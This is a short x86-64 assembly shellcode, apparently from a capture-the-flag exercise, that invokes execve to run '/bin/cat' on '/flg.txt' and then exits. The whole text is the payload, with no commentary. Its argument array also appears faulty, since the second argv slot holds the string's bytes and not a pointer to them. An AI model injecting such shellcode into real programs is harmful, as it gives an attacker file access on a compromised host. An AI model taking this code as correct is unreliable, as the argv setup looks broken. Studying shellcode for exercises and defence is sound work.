global _start

section .text
  _start:
    xor rax,rax
    mov al, 59
    push 0
    mov rdi, '/bin/cat'
    push rdi
    mov rdi, rsp
    push 0
    mov rsi, '/flg.txt'
    push rsi
    push rdi
    mov rsi, rsp
    xor rdx,rdx
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall
